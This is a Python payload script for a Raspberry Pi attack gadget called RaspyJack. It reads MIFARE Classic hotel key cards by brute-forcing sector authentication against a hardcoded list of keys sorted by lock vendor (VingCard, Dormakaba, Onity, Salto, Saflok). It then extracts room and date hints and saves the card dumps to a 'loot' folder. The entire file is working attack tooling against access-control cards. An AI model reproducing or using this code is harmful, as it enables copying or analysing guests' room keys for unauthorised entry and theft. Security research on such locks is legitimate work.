#!/usr/bin/env python3
"""
RaspyJack Payload -- Hotel Card Reader
=========================================
Read hotel key cards (MIFARE Classic) with hospitality-specific key dictionary.
Targets: Assa Abloy/VingCard, Dormakaba, Onity, Salto, ASSA ABLOY Hospitality.

Controls:
  OK         Read card
  UP/DOWN    Scroll sectors
  KEY2       Save dump
  KEY3       Exit
"""
import os, sys, time, json
from datetime import datetime
sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads.nfc_rfid._nfc_driver import auto_detect, is_classic
from payloads.nfc_rfid._nfc_keys import KNOWN_KEYS
from payloads.nfc_rfid._nfc_cards import save_dump

PINS = {"UP":6,"DOWN":19,"LEFT":5,"RIGHT":26,"OK":13,"KEY1":21,"KEY2":20,"KEY3":16}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT
DEBOUNCE = 0.18
_last_btn = 0
LOOT_DIR = "/root/Raspyjack/loot/NFC/hotel"

# Hotel-specific keys (ordered by likelihood)
HOTEL_KEYS = [bytes.fromhex(k) for k in [
    "FFFFFFFFFFFF", "A0A1A2A3A4A5", "D3F7D3F7D3F7",
    # Assa Abloy / VingCard
    "AE8E8B3C0AFF", "A0A1A2A3A4A5", "484558414354",
    "564C505249CB", "4B0B20107CCB", "FC00018778F7",
    # Dormakaba / ILCO / Kaba
    "010203040506", "0A0B0C0D0E0F", "D3F7D3F7D3F7",
    "A22AE129C013", "49FAE4E3849F", "38FCF33072E0",
    # Onity / Allegion
    "FC00018778F7", "A0478CC39091", "8FD0A4F256E9",
    "533CB6C723F6", "2612FEE7F4CE",
    # Salto
    "A22AE129C013", "62D0C424ED8E", "E64A986A5D94",
    "8829DA9DAF76", "8A1F424104D3",
    # Saflok
    "314B49474956", "564C505249CB", "0604DF988000",
    # Generic hotel
    "000000000000", "B0B1B2B3B4B5", "AABBCCDDEEFF",
    "1A2B3C4D5E6F",
]] + KNOWN_KEYS[:20]

# Deduplicate
_seen = set()
HOTEL_KEYS_UNIQUE = []
for k in HOTEL_KEYS:
    h = k.hex()
    if h not in _seen:
        _seen.add(h)
        HOTEL_KEYS_UNIQUE.append(k)
HOTEL_KEYS = HOTEL_KEYS_UNIQUE

def _btn():
    global _last_btn
    b = get_button(PINS, GPIO)
    now = time.time()
    if b and now - _last_btn < DEBOUNCE: return None
    if b: _last_btn = now
    return b

def _interpret_sector(blocks, sector):
    """Try to interpret hotel card data from sector blocks."""
    hints = []
    for blk in blocks:
        if not blk or blk == "?" * 32: continue
        raw = bytes.fromhex(blk)
        # Look for ASCII strings (room numbers, dates)
        ascii_chars = "".join(chr(b) if 32 <= b < 127 else "." for b in raw)
        cleaned = ascii_chars.replace(".", "").strip()
        if len(cleaned) >= 3:
            hints.append(f"Text: {cleaned[:16]}")
        # Look for date patterns (YYMM, DDMM, timestamps)
        h = blk.upper()
        for i in range(0, len(h) - 7, 2):
            chunk = h[i:i+8]
            if chunk[:2] in ("20", "19") and chunk[2:4].isdigit():
                yy, mm = int(chunk[2:4]), int(chunk[4:6])
                if 1 <= mm <= 12:
                    hints.append(f"Date: 20{yy:02d}/{mm:02d}")
    return hints[:2]

def main():
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    font = scaled_font(10)
    font_sm = scaled_font(9)

    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 50), "Detecting reader...", font=font_sm, fill="#FFAA00")
    lcd.LCD_ShowImage(img, 0, 0)
    drv, drv_desc = auto_detect()
    status = drv_desc if drv else "No reader"
    card = None
    sectors = []
    scroll = 0

    try:
        while True:
            btn = _btn()
            if btn == "KEY3": break
            if btn == "UP": scroll = max(0, scroll - 1)
            if btn == "DOWN" and sectors: scroll = min(scroll + 1, max(0, len(sectors) - 4))

            if btn == "OK" and drv:
                img = Image.new("RGB", (WIDTH, HEIGHT), "black")
                d = ScaledDraw(img)
                d.text((4, 50), "Place hotel card...", font=font_sm, fill="#FFAA00")
                lcd.LCD_ShowImage(img, 0, 0)
                card = drv.read_passive_target(timeout=5.0)
                if card and is_classic(card):
                    sectors = []
                    scroll = 0
                    last_key = None
                    for sec in range(16):
                        block = sec * 4
                        pct = sec * 100 // 16
                        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
                        d = ScaledDraw(img)
                        d.rectangle((0, 0, 127, 14), fill="#111")
                        d.text((2, 2), "HOTEL READ", font=font_sm, fill="#FFAA00")
                        d.text((80, 2), f"{pct}%", font=font_sm, fill="#FFAA00")
                        d.rectangle((4, 30, 123, 38), outline="#333")
                        bw = max(1, int(119 * sec / 16))
                        d.rectangle((4, 30, 4 + bw, 38), fill="#FFAA00")
                        d.text((4, 50), f"Sector {sec}/16", font=font_sm, fill="#ccc")
                        lcd.LCD_ShowImage(img, 0, 0)

                        key_found = None
                        kt_found = 0x60
                        if last_key:
                            if drv.mifare_auth(block, last_key[0], card.uid, last_key[1]):
                                key_found, kt_found = last_key
                        if not key_found:
                            for key in HOTEL_KEYS:
                                if drv.mifare_auth(block, key, card.uid, 0x60):
                                    key_found = key; kt_found = 0x60; break
                        if not key_found:
                            for key in HOTEL_KEYS[:10]:
                                if drv.mifare_auth(block, key, card.uid, 0x61):
                                    key_found = key; kt_found = 0x61; break
                        blocks = []
                        if key_found:
                            last_key = (key_found, kt_found)
                            for b in range(4):
                                data = drv.mifare_read(block + b)
                                blocks.append(data.hex() if data else "?" * 32)
                        hints = _interpret_sector(blocks, sec) if blocks else []
                        sectors.append({"sector": sec, "blocks": blocks,
                                        "key": key_found.hex().upper() if key_found else "",
                                        "key_type": "A" if kt_found == 0x60 else "B",
                                        "hints": hints})
                    cracked = sum(1 for s in sectors if s["key"])
                    status = f"{cracked}/16 sectors read"
                elif card:
                    status = f"Not Classic: {card.card_type}"
                else:
                    status = "No card"

            if btn == "KEY2" and card and sectors:
                os.makedirs(LOOT_DIR, exist_ok=True)
                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                fname = f"hotel_{card.uid_hex}_{ts}.json"
                with open(os.path.join(LOOT_DIR, fname), "w") as f:
                    json.dump({"uid": card.uid_hex, "type": card.card_type, "sectors": sectors, "timestamp": ts}, f, indent=2)
                status = f"Saved: {fname[:16]}"

            # Draw
            img = Image.new("RGB", (WIDTH, HEIGHT), "black")
            d = ScaledDraw(img)
            d.rectangle((0, 0, 127, 14), fill="#111")
            d.text((2, 2), "HOTEL CARD", font=font_sm, fill="#FFAA00")
            y = 20
            d.text((4, y), status[:24], font=font_sm, fill="#FFAA00"); y += 13

            if sectors:
                for i in range(scroll, min(len(sectors), scroll + 4)):
                    if y > 105: break
                    s = sectors[i]
                    col = "#00FF00" if s["key"] else "#FF4444"
                    key_txt = s["key"][:6] if s["key"] else "LOCKED"
                    d.text((2, y), f"S{s['sector']:02d} [{key_txt}]", font=font_sm, fill=col)
                    y += 11
                    for hint in s.get("hints", []):
                        d.text((8, y), hint[:20], font=font_sm, fill="#00CCFF")
                        y += 10
            else:
                d.text((4, 55), "Press OK to scan", font=font_sm, fill="#666")
                d.text((4, 72), f"{len(HOTEL_KEYS)} hotel keys", font=font_sm, fill="#888")

            d.rectangle((0, 116, 127, 127), fill="#111")
            d.text((2, 117), "OK:Read K2:Save K3:X", font=font_sm, fill="#666")
            lcd.LCD_ShowImage(img, 0, 0)
            time.sleep(0.03)
    finally:
        if drv: drv.close()
        try: lcd.LCD_Clear()
        except: pass
        GPIO.cleanup()
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
